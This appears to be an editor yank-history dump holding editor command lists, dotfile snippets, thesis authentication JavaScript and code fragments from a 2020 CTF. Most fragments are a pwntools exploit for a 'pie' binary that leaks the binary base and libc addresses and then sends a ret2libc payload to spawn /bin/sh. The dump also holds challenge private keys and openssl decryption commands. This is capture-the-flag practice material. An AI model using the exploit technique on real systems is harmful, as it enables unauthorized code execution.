	ccls.memberHierarchy	Member Hierarchy
	ccls.closeCallHierarchy	Close
	ccls.closeMemberHierarchy	Close
	ccls.inheritanceHierarchy	Inheritance Hierarchy
	ccls.closeInheritanceHierarchy	Close
	document.renameCurrentWord	rename word under cursor in current buffer by use multiple cursors.
	tsserver.goToProjectConfig	Open project config file.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	yank.clean
	java.projectConfiguration.update	Update project configuration
	java.clean.workspace	Clean the Java language server workspace
	python.createTerminal	Create Terminal
	java.workspace.compile	Force Java compilation
	workspace.clearWatchman	run watch-del-all for watchman to free up memory.
	tsserver.watchBuild	Run `tsc --watch` for current project by use vim's job feature.
	workspace.showOutput	open output buffer to show output from languageservers or extensions.
	python.execInTerminal	Run Python File in Terminal
	python.goToPythonObject	Go to Python Object
	tsserver.reloadProjects	Reload current project
	tsserver.executeAutofix	Fix autofixable problems of current document.
	extensions.forceUpdateAll
	workspace.workspaceFolders	show opened workspaceFolders.
	java.action.organizeImports	Organize Imports
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	editor.action.organizeImport	run organize import code action.
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
58e347647890ef034b000fa8beba6044|file:///home/neo/ccsc/echoes/scan.py|6|1|V|python
	f.write("Now the file has more content!")
	f.close()
7083e0038b54031f514cb280a9c888e9|file:///home/neo/ccsc/echoes/scan.py|15|1|V|python
	print(payload)
bb579fc243aff434cbdc9512e53193fa|file:///home/neo/ccsc/echoes/scan.py|13|9|v|python
	"Now the file has more content!"
3f14e9eda05eb1c144ece2bf4545ca69|file:///home/neo/ccsc/echoes/scan.py|5|11|v|python
	demofile2
f88072349efe932c3d6000f9ec217326|file:///home/neo/ccsc/echoes/scan.py|2|1|V|python
	#os.system("tshark  -T fields  -e frame.time -e  data.data -w Eavesdrop_Data.pcap > Eavesdrop_Data.txt -F pcap -c 1000")
88bfebd9106cd60a416d53ee962e2b04|file:///home/neo/ccsc/echoes/scan.py|2|1|V|python
	#I commented out the t-shark so i could just reuse the same data
f432b49d606d24e05bf58fd398a6b1e9|file:///home/neo/ccsc/echoes/scan.py|1|1|V|python
	from scapy.all import *
	f = open("secret.png", "a")
	
	packets = "secret_packets.pcapng"
	data = rdpcap(packets)
	payload = ""
	for packet in data:
	    payload += packet[Raw].load
	
	f.write(payload)
	f.close()
	
660d4cea772ff8fb0c1fadc5668b910b|file:///home/neo/ccsc/pie/exploit.py|83|25|v|python
	sym.print_pie
6f8cdb452fafacd78a24b96aaebaba92|file:///home/neo/ccsc/pie/exploit.py|83|1|V|python
	PRINT_PIE_OFFSET2 = exe.sym["print_pie"]
8a89158f88ed31ebbe78d43a230d6fcf|file:///home/neo/ccsc/pie/exploit.py|84|1|V|python
	log.info("Print pie offset2: %#x" % PRINT_PIE_OFFSET2)
91dcc547f2cf177a5293c0a85adebc0e|file:///home/neo/ccsc/pie/exploit.py|82|1|V|python
	PRINT_PIE_OFFSET = exe.sym.print_pie
	log.info("Print pie offset: %#x" % PRINT_PIE_OFFSET)
	
	# PUT_PIE_OFFSET = exe.sym.put_pie
	# log.info("Put pie offset %#x" % PUT_PIE_OFFSET)
	# Leak print_pie address
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	io.sendline("A" * 31)
	line = io.recvline_contains("Got this:")
	leaked = io.recvline()
	# log.info("Leaked: %s" % leaked)
	print_pie_addr = u32(leaked[:4])
	BINARY_BASE_ADDR = print_pie_addr - PRINT_PIE_OFFSET
	log.info("Print pie addr: %#x" % print_pie_addr)
	log.info("Binary base addr: %#x" % BINARY_BASE_ADDR)
e863a023b980993d01da49f5443a8299|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|59|1|V|python
	# PUT_PIE_OFFSET = exe.sym.put_pie
	# log.info("Put pie offset %#x" % PUT_PIE_OFFSET)
9fa8605ea242040db3da7c72878a0a4f|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|73|1|V|python
	# shellcode = asm(shellcraft.sh())
	# payload = fit({
	#     32: 0xdeadbeef,
	#     'iaaa': [1, 2, 'Hello', 3]
	# }, length=128)
	# io.send(payload)
	# flag = io.recv(...)
	# log.success(flag)
	
82ee9923cf6f0245bd927f2f4631cc0e|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|57|1|V|python
	io = start()
	PRINT_PIE_OFFSET = exe.sym.print_pie
	log.info("Print pie offset: %#x" % PRINT_PIE_OFFSET)
	
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	io.sendline("A" * 31)
	line = io.recvline_contains("Got this:")
	leaked = io.recvline()
	print_pie_addr = u32(leaked[:4])
	log.info("Print pie addr: %#x" % print_pie_addr)
	BINARY_BASE_ADDR = print_pie_addr - PRINT_PIE_OFFSET
	log.info("Binary base addr: %#x" % BINARY_BASE_ADDR)
	
d223a668d5af23e7bf06782a7630e918|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|56|1|V|python
	# Step 1: Leak print_pie address and calculate base address of binary
33ccede2b07c99755d0f87f28c977d8f|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|56|1|V|python
	io = start()
	
	# Step 1: Leak print_pie address and calculate base address of binary
	PRINT_PIE_OFFSET = exe.sym.print_pie
	log.info("Print pie offset: %#x" % PRINT_PIE_OFFSET)
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	io.sendline("A" * 31)
	line = io.recvline_contains("Got this:")
	leaked = io.recvline()
	print_pie_addr = u32(leaked[:4])
	log.info("Print pie addr: %#x" % print_pie_addr)
	BINARY_BASE_ADDR = print_pie_addr - PRINT_PIE_OFFSET
	log.info("Binary base addr: %#x" % BINARY_BASE_ADDR)
ec6e30cff83117eeddd55ef665a8090d|file:///home/neo/ccsc/pie/exploit.py|94|1|V|python
	# log.info("Leaked: %s" % leaked)
f3046bbf14951afe71f9f33d3688ecd3|file:///home/neo/ccsc/pie/exploit.py|100|1|V|python
	PUTS_GOT = BINARY_BASE_ADDR + exe.got["puts"]
	PUTS_PLT = BINARY_BASE_ADDR + exe.plt["puts"]
	PRINTF_GOT = BINARY_BASE_ADDR + exe.got["printf"]
c318156611efd37a3a33f215a9c34e74|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|80|1|V|python
	payload = "A" * 40 + p32(PUTS_GOT - 0x18) +"AAAA"
a259c1a6202a49d2a6ea7ca89bfafb1b|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|92|1|V|python
	# payload = "A" * 40 + p32(PUTS_GOT - 0x18) +"AAAA"
8be4fb027010213d7f1bed655432626b|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|80|19|v|python
	 + p32(PUTS_GOT - 0x18) +"AAAA"
8748d135d4a7020b85ad4276daebdc87|file:///home/neo/ccsc/pie/exploit.py|110|1|V|python
	MAIN_ADDR = BINARY_BASE_ADDR + exe.sym.main
	log.info("Main: %#x" % MAIN_ADDR)
c0efc76181a433c258e3c7147de7dac5|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|74|1|V|python
	log.info("Main: %#x" % MAIN_ADDR)
a02c83a7dbd96295beaefb72c2bee2de|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|76|11|v|python
	Main
a5cc8f53e8087cbdc93154defca092dd|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|76|1|V|python
	log.info("P: %#x" % MAIN_ADDR)
f5d19caf6f6d217394274487c6ef3409|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|72|1|V|python
	# Step 2: Leak the address of two libc functions and find the libc version
	MAIN_ADDR = BINARY_BASE_ADDR + exe.sym.main
	PUTS_PLT = BINARY_BASE_ADDR + exe.plt["puts"]
	PRINTF_GOT = BINARY_BASE_ADDR + exe.got["printf"]
	
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	payload = "A" * 48
	payload += p32(PUTS_PLT)
	payload += p32(MAIN_ADDR)
	payload += p32(PRINTF_GOT)
	io.sendline(payload)
	line = io.recvline_contains("Got this:")
	log.info("Received: %s" % line)
	line = io.recvline()
	line = io.recv(4)
	PRINTF_LIBC = u32(line)
	log.info("Received: %s" % line)
	log.info("Printf@libc: %#x" % PRINTF_LIBC)
	
3d6c0f2f96a033e02f9b26d99e9d730d|file:///home/neo/ccsc/pie/exploit.py|65|1|V|python
	if args.GEF:
	    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
	    pie breakpoint put_pie+68
	    pie breakpoint put_pie+118
	    ''')
3a8e705923261299e077c38e1dcd7857|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|60|1|V|python
	    pie breakpoint put_pie+68
	    pie breakpoint put_pie+118
2196f051438d9804bd94239382408187|file:///home/neo/ccsc/pie/exploit.py|8|1|V|python
	exe = context.binary = ELF('./pie')
	context.terminal = ['tmux', 'splitw', '-h']
0370b2f119bf88bb1ba784fa26fa613a|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|9|1|V|python
	exe = context.binary = ELF('./pie')
ac68c16245a939a8f4a7cbbcf5605b4c|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|87|1|V|python
	payload = "A" * 48
e166f7e094d8880657115197bdb81329|file:///home/neo/ccsc/pie/exploit.py|145|1|V|python
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	payload = "A" * 40 + p32(PUTS_GOT - 0x18) +"AAAA"
	payload += p32(PUTS_PLT)
	payload += p32(MAIN_ADDR)
	payload += p32(FFLUSH_GOT)
	io.sendline(payload)
	line = io.recvline_contains("Got this:")
	log.info("Received: %s" % line)
	line = io.recvline()
	line = io.recv(4)
	FFLUSH_LIBC = u32(line)
	log.info("Received: %s" % line)
	log.info("Fflush@libc: %#x" % FFLUSH_LIBC)
	
2511c55403448f9d14f543723699d08b|file:///home/neo/ccsc/pie/exploit.py|77|47|v|python
	libc-2.23.so
38ba18181a6e1c7560638f65596a7d3b|file:///home/neo/ccsc/pie/exploit.py|77|1|V|python
	libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64/libc-2.23.so")
b59a49758be097aaf7c630aaa4a5aadd|file:///home/neo/ccsc/pie/exploit.py|77|47|v|python
	libc-2.23.so")
6a543b11f300d2cc53b48d0b21a585e0|file:///home/neo/ccsc/pie/exploit.py|77|1|V|python
	libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64/libc-2.23.so")
	
	SYSTEM_OFFSET = libc.sym.system
	log.info("System offset: %#x" % SYSTEM_OFFSET)
	
	PRINT_PIE_OFFSET = exe.sym.print_pie
	log.info("Print pie offset: %#x" % PRINT_PIE_OFFSET)
c5e93731d86370f6d2cd4cd837b2f067|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|115|14|v|python
	libc6-i386_2.23-0ubuntu10_amd64
b195f2d97f1385457627ebbe2a09d984|file:///home/neo/ccsc/pie/exploit.py|163|1|V|python
	LIBC_BASE = PUTS_LIBC - libc.sym.puts
	BINSH_ADDR = LIBC_BASE + next(libc.search('/bin/sh\x00')) 
	SYSTEM_ADDR = LIBC_BASE + libc.sym.system
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	payload = "A" * 48 
	payload += p32(SYSTEM_ADDR)
	payload += "AAAA"
	payload += p32(BINSH_ADDR)
	io.sendline(payload)
	# line = io.recvline_contains("Got this:")
	line = io.recvline()
	log.info("Received: %s" % line)
ec6ed2f37788045d1c68d726cd419514|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|127|1|V|python
	io.sendline(payload)
4113427241757510ca97c22da7f0dfca|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|127|1|V|python
	
	SYSTEM_OFFSET = libc.sym.system
	log.info("System offset: %#x" % SYSTEM_OFFSET)
	
	PRINT_PIE_OFFSET = exe.sym.print_pie
	log.info("Print pie offset: %#x" % PRINT_PIE_OFFSET)
	
f5acc561b026ae694ec869135e50a34c|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|118|1|V|python
	log.info("System offset: %#x" % SYSTEM_OFFSET)
a85a86d8268edb9dde518f67ba740b24|file:///home/neo/ccsc/pie/exploit.py|173|1|V|python
	io.sendline(payload)
	# line = io.recvline_contains("Got this:")
	line = io.recvline()
	log.info("Received: %s" % line)
6393b7dfcbafbd66935fcaaac88fde5a|file:///home/neo/ccsc/pie/exploit.py|173|1|V|python
	# line = io.recvline_contains("Got this:")
	line = io.recvline()
	log.info("Received: %s" % line)
43aed33441345d845144a53ffad7a117|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|116|1|V|python
	# libc = ELF("./libc-2.30.so")
	
	# SYSTEM_OFFSET = libc.sym.system
	
	# LIBC_BASE = PRINTF_LIBC - libc.sym.printf
	# BINSH_ADDR = LIBC_BASE + next(libc.search('/bin/sh\x00')) 
	# SYSTEM_ADDR = LIBC_BASE + libc.sym.system
	# line = io.recvuntil("Please enter an option from the main menu:")
	# io.sendline('2')
	# line = io.recvuntil("Give me your pie:")
	# payload = "A" * 48 
	# payload += p32(SYSTEM_ADDR)
	# payload += "AAAA"
	# payload += p32(BINSH_ADDR)
	# io.sendline(payload)
	# line = io.recvline()
	# log.info("Received: %s" % line)
	
682d5a668a912b0a75713a85da8204f0|file:///home/neo/ccsc/pie/exploit.py|78|15|v|python
	libc6
9a8ce2f897295fbf0ad92069f4ff6fec|file:///home/neo/ccsc/pie/exploit.py|78|13|v|python
	./-i386_2.23-0ubuntu10_amd64/libc-2.23.so
6850e2be7f32fe3a8d12625913381fd1|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|130|1|V|python
	io.sendline(payload)
	line = io.recvline()
	log.info("Received: %s" % line)
8d23e9985e97a00c22ddc60c82100706|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|61|5|V|python
	    pie breakpoint put_pie+68
ecb7f181f5abe04a1ece8770cb5b68e9|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|62|5|V|python
	    pie breakpoint put_pie+118
8f0af54e9081f96a49fb50952349e3c5|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|111|1|V|python
	log.info("Fflush@libc: %#x" % FFLUSH_LIBC)
295a10b3041194175c25556f415ff0e3|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|116|1|V|python
	libc = ELF("./libc-2.30.so")
1f44472743c0e15501186b651c8f34c4|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|123|1|V|python
	log.info("system@libc: %#x" % SYSTEM_ADDR)
54b53072540eeeb8f8e9343e71f28176|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|124|11|v|python
	system
10a0d19c8223e8373848b4a6e466e4f0|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|124|30|v|python
	SYSTEM_ADDR
e2f7c0a1df075a748ca0c2ebe4833ad4|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|129|1|V|python
	payload += p32(SYSTEM_ADDR)
3c6aa51c6cd71e48944c1ccd173c4cf7|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|130|1|V|python
	payload += "BBBB"
d79a38cdb7af900aa4588db619bea8f7|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|129|1|V|python
	payload += p32(SYSTEM_ADDR)
	payload += "BBBB"
70ad167eca52213942db262b1503e814|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|102|22|^v|python
	p32(PUTS_GOT - 0x18) 
90d9cef81cc1ce66bfaba81a65d5ddbc|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|128|1|V|python
	# payload = "A" * 44 + p32(PUTS_GOT - 0x18) 
113f020182a8bbe4e864ed5f46b5b825|file:///home/neo/CTFs/ccsc2020/pie/exploit.py|115|1|V|python
	# libc = ELF("./libc-2.23.so")
	libc = ELF("./libc-2.30.so")
	
	SYSTEM_OFFSET = libc.sym.system
	
	LIBC_BASE = PRINTF_LIBC - libc.sym.printf
	BINSH_ADDR = LIBC_BASE + next(libc.search('/bin/sh\x00')) 
	SYSTEM_ADDR = LIBC_BASE + libc.sym.system
	log.info("system@libc: %#x" % SYSTEM_ADDR)
	log.info("binsh@libc: %#x" % BINSH_ADDR)
	line = io.recvuntil("Please enter an option from the main menu:")
	io.sendline('2')
	line = io.recvuntil("Give me your pie:")
	# payload = "A" * 44 + p32(PUTS_GOT - 0x18) 
	payload = "A" * 48
	payload += p32(SYSTEM_ADDR)
	payload += "BBBB"
	payload += p32(BINSH_ADDR)
	io.sendline(payload)
	line = io.recvline()
	log.info("Received: %s" % line)
	
8eccf4dfb965678c275e4ff83a613807|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/time-key-generation.js|8|1|V|javascript
	    const message = "af82";
f829df5642840445bf4586753d079630|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/time-key-generation.js|9|1|V|javascript
	        let public_key = keypair.substr(64,128);
	        let signedMessageBytes = await signMessage(keypair, message);
	        let signedMessageArray = Array.from(new Uint8Array(signedMessageBytes));
	        let signature = signedMessageArray.map(b => b.toString(16).padStart(2, '0')).join('');
3483cd94c132253d1f920fe4e504d5ff|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/time-key-generation.js|19|5|V|javascript
	    let username = document.getElementById("username").value;
65e993c8dd776ef6b6a74ca69a0a3fea|file:///home/neo/Documents/diplomatiki/auth-webapp/form.html|9|1|V|html
	<script type = "text/javascript" src = "myjs.js"></script>
409a2ed1f081e3f7d7fb34f60816fb77|file:///home/neo/Documents/diplomatiki/auth-webapp/form.html|8|1|V|html
	<script type = "text/javascript" src = "wordpress/wp-includes/auth.js"></script>
17ad6893c2e05ddb1d4de91500357800|file:///home/neo/Documents/diplomatiki/auth-webapp/form.html|9|41|v|html
	wordpress/wp-includes/auth.js
c79bdf421714f5087fc34b7c538b6807|file:///home/neo/Documents/diplomatiki/auth-webapp/form.html|22|17|v|html
	submit
f09c5c8a7fe13c12454aa330f79cc238|file:///home/neo/.zshrc|136|1|V|zsh
	__conda_setup="$('/media/neo/Storage/anaconda3/bin/conda' 'shell.bash' 'hook' 2> /dev/null)"
	if [ $? -eq 0 ]; then
	    eval "$__conda_setup"
	else
	    if [ -f "/media/neo/Storage/anaconda3/etc/profile.d/conda.sh" ]; then
	        . "/media/neo/Storage/anaconda3/etc/profile.d/conda.sh"
	    else
	        export PATH="/media/neo/Storage/anaconda3/bin:$PATH"
	    fi
	fi
	unset __conda_setup
d4346b8fd67263b9655edea34f32ec21|file:///home/neo/.vimrc|1|1|v|vim
	execute pathogen#infect()
	execute pathogen#helptags()
	syntax on
	filetype plugin indent on
	colorscheme OceanicNext
	set clipboard=unnamedplus
	
	let g:tex_flavor = 'latex'
	
	" Mappings
	let maplocalleader="\<space>"
	let mapleader = ","
	map <C-o> :NERDTreeToggle<CR>
	map <C-p> :Files<CR>
	map <C-a> <esc>ggVG<CR>
	map <leader>lc :lclose<CR>
	
	" File navigation
	map <C-h> <C-w>h
	map <C-j> <C-w>j
	map <C-k> <C-w>k
	map <C-l> <C-w>l
	
	" Tabbing
	
	filetype plugin indent on
	" show existing tab with 4 spaces width
	set tabstop=4
	" when indenting with '>', use 4 spaces width
	set shiftwidth=4
	" On pressing tab, insert 4 spaces
	set expandtab
	
	" Shellcheck current script
	map <leader>k :!clear && shellcheck %<CR>
	
	" Save file as sudo
	command! -nargs=0 Sw w !sudo tee % > /dev/null
	
	" Run spellcheck
	map <leader>s :setlocal spell!<CR>
	
	" Set spelling language to greek
	map <leader>l :set spelllang=el<CR>
	
	" Compile and run current program (from Luke Smith)
	map <leader>cc :!compiler %<CR>
	" Set arguments before compiling
	map <leader>ca :!compiler %<space>
	
	" Basic 
	
	" Ignore search case by default
	set ic
	
	set number relativenumber
	set wildmode=longest,list,full
	set splitbelow splitright
	set showcmd
	
	" YCM settings
	let g:ycm_extra_conf_globlist = ['~/.vim/bundle/youcompleteme/*','/media/neo/Storage/mozilla-central/*']
	let g:ycm_auto_trigger = 1
	
	" 
bc44788442d8bcc37c249e94d7dd83d1|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/time-signature-only.js|2|16|v|javascript
	createAndSign
31bb4eacf6fc84098b56914919a57a0b|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/time-signature-only.js|9|18|V|javascript
	        let keypair = await createKeyPairFromPassword(password);
	        let public_key = keypair.substr(64,128);
14c4b06b824ec593239362517f538b29|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/time-signature-only.js|2|28|v|javascript
	username
dc64b89525448eaa1dac423f0e94e1b2|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/auth.js|45|1|V|javascript
	let signMessage = async function(keypair, message) {
	  const input = keypair.concat(message);
	  const inputBuf = hexToBytes(input);
	  const inputArray = new Uint8Array(inputBuf);
	  return crypto.subtle.digest("ED25519SIGN", inputArray);
8a1d465b94af61569742ab579c15a5c0|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/time-signature-only.js|11|1|V|javascript
	    let public_key = keypair.substr(64,128);
f4eef2611b6805c2f56b0c86e6799eac|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/time-signature-only.js|16|40|v|javascript
	signMessage(keypair, message)
a9eb9eb7dd3ad812a2b19308b6ff4666|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/time-signature-only.js|18|9|V|javascript
	        let signature = signedMessageArray.map(b => b.toString(16).padStart(2, '0')).join('');
b75db29c3f1ecb5ca28e72e1cceeeae4|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/time-signature-only.js|17|9|V|javascript
	        let signedMessageArray = Array.from(new Uint8Array(signedMessageBytes));
0d97a425a311963000fe4b3ca06428aa|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/time-signature-only.js|15|9|V|javascript
	        const message = "af82";
3044ee54a2bdec684c28aeb2cdc3378a|file:///home/neo/Documents/diplomatiki/auth-webapp/form.html|9|49|v|html
	time-key-generation.js"></s
c29806d2da2559e5c6b9a30bf7719647|file:///home/neo/Documents/diplomatiki/auth-webapp/form.html|9|49|v|html
	time-key-generation
bae82bdcec0f6cb1952d534f725e9650|list:/commands|40|1|V|list
	prettier.formatFile
	snippets.openSnippetFiles	Edit snippets files of current document filetype.
	snippets.editSnippets	Edit user snippets file of current document filetype.
	workspace.showOutput	open output buffer to show output from languageservers or extensions.
	workspace.clearWatchman	run watch-del-all for watchman to free up memory.
	workspace.workspaceFolders	show opened workspaceFolders.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	extensions.toggleAutoUpdate	toggle auto update of extensions.
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	document.renameCurrentWord	rename word under cursor in current buffer by use multiple cursors.
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.sortImports	Sort Imports
	python.startREPL	Start REPL
	python.createTerminal	Create Terminal
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.execInTerminal	Run Python File in Terminal
	python.setInterpreter	Select Interpreter
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	python.viewOutput	Show output
	python.goToPythonObject	Go to Python Object
	python.setLinter	Select Linter
	python.enableLinting	Enable Linting
	python.runLinting	Run Linting
	tsserver.reloadProjects	Reload current project
	tsserver.openTsServerLog	Open log file of tsserver.
	tsserver.goToProjectConfig	Open project config file.
	tsserver.restart	Restart tsserver
	tsserver.watchBuild	Run `tsc --watch` for current project by use vim's job feature.
	tsserver.executeAutofix	Fix autofixable problems of current document.
	java.updateLanguageServer	Download latest snapshots of jdt.ls from eclipse.org.
	java.projectConfiguration.update	Update project configuration
	java.open.serverLog	Open Java Language Server log file
	java.workspace.compile	Force Java compilation
	java.action.organizeImports	Organize Imports
	java.open.formatter.settings	Open Java formatter settings
	java.clean.workspace	Clean the Java language server workspace
	session.save	Save current vim state to session file.
	session.load	Load session by name.
	session.restart	Restart vim with current session.
	mru.validate	Validate mru files list, which remove files that doesn't exist.
	ccls.reload	Reload Index
	ccls.restart	Restart language server
	ccls.restartLazy	Restart language server in lazy mode
	ccls.callHierarchy	Call Hierarchy
	ccls.call.useCallers	Callers
	ccls.call.useCallees	Callees
	ccls.closeCallHierarchy	Close
	ccls.inheritanceHierarchy	Inheritance Hierarchy
	ccls.closeInheritanceHierarchy	Close
	ccls.memberHierarchy	Member Hierarchy
	ccls.closeMemberHierarchy	Close
	ccls.vars	Show Variables
	ccls.call	Show Cross References
	ccls.base	Show Base
	ccls.gotoForTreeView	Go to Tree View Entry
	go.install.gomodifytags	Install / update gomodifytags
	go.install.goplay	Install / update goplay
	go.install.gopls	Install / update gopls
	go.install.gotests	Install / update gotests
	go.playground	Run on go playground
	go.tags.add	Add tags to struct fields
	go.tags.add.line	Add tags to struct field in current line
	go.tags.add.prompt	Add tags to struct fields (prompt)
	go.tags.clear	Remove all tags from struct fields
	go.tags.clear.line	Remove all tags from struct fields in current line
	go.tags.remove	Remove tags from struct fields
	go.tags.remove.line	Remove tags from struct field in current line
	go.tags.remove.prompt	Remove tags from struct fields (prompt)
	go.test.generate.exported	Generate unit tests for exported functions in file
	go.test.generate.file	Generate unit tests for file
	go.test.toggle	Toggle test file
	go.version	Print extension version
	sh.version	Print extension version
	sh.update.bash-language-server	Update bash-language-server
	editor.action.organizeImport	run organize import code action.
	extensions.forceUpdateAll
	tags.generate
	prettier.open-output
	yank.clean
a17df2f813d6953854675dea96cb9251|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/time-keypair-signature.js|1|1|V|javascript
	// async function signTest (keypair, message) {
	//   const input = keypair.concat(message);
	//   const inputBuf = hexToBytes(input);
	//   const inputArray = new Uint8Array(inputBuf);
	//   return crypto.subtle.digest("ED25519SIGN", inputArray);
	// };
234774e85214711b7694fa84b6396257|file:///home/neo/Documents/diplomatiki/auth-webapp/timings/time-keypair-signature.js|4|2|V|javascript
	    let keypair = await createKeyPairFromPassword(password);
	    const message = "af82";
dabd611aa3e0c293bc5e75ee172e161f|file:///home/neo/Documents/diplomatiki/auth-webapp/form.html|9|49|v|html
	time-signature-only
82f21225760098b0d99c9e27a6b63d15|file:///home/neo/ccsc/notes/writeups|27|1|V|conf
	-> Calculated shared key with openssl:
	openssl pkeyutl -derive -inkey key1.pem -peerkey key2_pub.pem -out alice_shared_secret.bin
d48dec1d1d4858c80943931d2fa4f3d9|file:///home/neo/CTFs/ccsc2020/eclectic_dishonor/jwk-pem.js|4|1|V|javascript
	var jwk = {"kty":"EC","crv":"P-256","x":"z8nGOX1EfiBxDqxecQTuuI1x8sbP_XHo96bqNL5GPR4","y":"MTluV7uwACZyEWtv72VOzDyt0QOSrY81A3g5b289xLg","d":"6gNP-y4ip6ozXs4Sft4B4l04pK1k_oE2F9WIxECuSV0"}
27baaf7f30dfd077f040b51cf9809d59|file:///home/neo/ccsc/notes/writeups|32|1|V|conf
	openssl enc -aes-256-ecb -nosalt -K 5cb22981192bcf1a99cbdb27a031bfe385c960829d46edea519e964009d7fcb3 -d -in secret
be9fab18c394abaca461efedc6e88205|file:///home/neo/CTFs/ccsc2020/eclectic_dishonor/jwk-pem.js|4|1|V|javascript
	let alice_jwk = {"kty":"EC","crv":"P-256","x":"EkNl3NbmPs2U8hhACOKQbbEi8xquVLOxiAUaP4t8-nY","y":"BrLJ8Ik-m8fH6oyvbmOMt_Cszk-CA3Iy2Kml1JPWRBA","d":"xN20K7FJBSlb6hc6FH9NG9blowLC06_bAADCYM__Ay0"}
	let alice_priv = jwkToPem(alice_jwk, {private: true});
	process.stdout.write(alice_priv);
6384e2b2184bcbf58eccf10ca7a6563c|file:///home/neo/CTFs/ccsc2020/eclectic_dishonor/jwk-pem.js|8|5|v|javascript
	alice
f4c51d239a1991e7cf3f6cef3ab74977|file:///home/neo/CTFs/ccsc2020/eclectic_dishonor/jwk-pem.js|8|1|V|javascript
	let bob_jwk = {"kty":"EC","crv":"P-256","x":"EkNl3NbmPs2U8hhACOKQbbEi8xquVLOxiAUaP4t8-nY","y":"BrLJ8Ik-m8fH6oyvbmOMt_Cszk-CA3Iy2Kml1JPWRBA","d":"xN20K7FJBSlb6hc6FH9NG9blowLC06_bAADCYM__Ay0"}
4d79858c894ab4e34f506f52cceada1c|file:///home/neo/CTFs/ccsc2020/eclectic_dishonor/jwk-pem.js|1|1|V|javascript
	var jwkToPem = require('jwk-to-pem'),
	    jwt = require('jsonwebtoken');
	 
	let alice_jwk = {"kty":"EC","crv":"P-256","x":"EkNl3NbmPs2U8hhACOKQbbEi8xquVLOxiAUaP4t8-nY","y":"BrLJ8Ik-m8fH6oyvbmOMt_Cszk-CA3Iy2Kml1JPWRBA","d":"xN20K7FJBSlb6hc6FH9NG9blowLC06_bAADCYM__Ay0"}
	let alice_priv = jwkToPem(alice_jwk, {private: true});
	process.stdout.write(alice_priv);
	
	let bob_jwk = {"kty":"EC","crv":"P-256","x":"XdmnSKZwZ6CtZhaYIGi5nPbOJPJoniKUiFMG1RegbzA","y":"o73agJQnypqYJKmG9htlAvdbKALzmDIfI51Tl0bo6SE","d":"f3Lg-iCE_BWBtJ0RC9aukTa1jw7bd6Xgf155sn311Ck"}
	let bob_priv = jwkToPem(bob_jwk, {private: true});
	process.stdout.write(bob_priv);
1bd2755e931fee1935edc6b3ac9b138b|file:///home/neo/CTFs/ccsc2020/eclectic_dishonor/alice_priv.pem|7|1|V|
	-----BEGIN EC PRIVATE KEY-----
	MCUCAQEEIMTdtCuxSQUpW+oXOhR/TRvW5aMCwtOv2wAAwmDP/wMt
	-----END EC PRIVATE KEY-----
